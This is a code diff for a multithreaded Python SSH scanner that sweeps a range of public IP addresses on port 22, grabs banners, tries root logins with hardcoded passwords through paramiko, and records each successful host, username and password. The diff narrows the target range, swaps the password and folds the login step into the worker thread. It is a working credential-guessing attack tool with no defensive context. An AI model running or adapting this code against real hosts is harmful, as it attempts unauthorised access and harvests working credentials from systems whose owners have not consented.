@@ -50,32 +50,26 @@ class Worker(threading.Thread):
             cli.connect((self.ip, self.port))
             banner = cli.recv(1024)
             print("[INFO] %s\t%s"% (self.ip, banner))
-            return self.ip
-        except Exception as e:
+            self.login()
+        except Exception:
             pass
 
-
-# Trying ssh connection with login password
-class Ssh(Worker):
     def login(self):
         try:
             ssh_cli = paramiko.SSHClient()
             ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh_cli.connect(self.host, port=self.port, username=self.username, password=self.password)
-            save_data("%s:%s:%s"% (self.host, self.username, self.password))
+            ssh_cli.connect(self.ip, port=self.port, username=self.username, password=self.password)
+            save_data("%s:%s:%s\n"% (self.ip, self.username, self.password))
             ssh_cli.close()
-        except Exception as e:
-            ssh_cli.close()
+        except Exception:
+            print("[ERROR] Login failure to %s"% self.ip)
 
-    def run(self):
-        if Worker.run(self):
-            print(Worker.run(self))
 
 
 def main():
-    ip_range = generate_hosts("65.39.60.1", "65.39.64.254")
+    ip_range = generate_hosts("65.39.64.1", "65.39.64.254")
     for ip in ip_range:
-        bot = Ssh(ip, 22, "root", "p@$$w0rd")
+        bot = Worker(ip, 22, "root", "12345Qwerty!")
         bot.start()
 
 
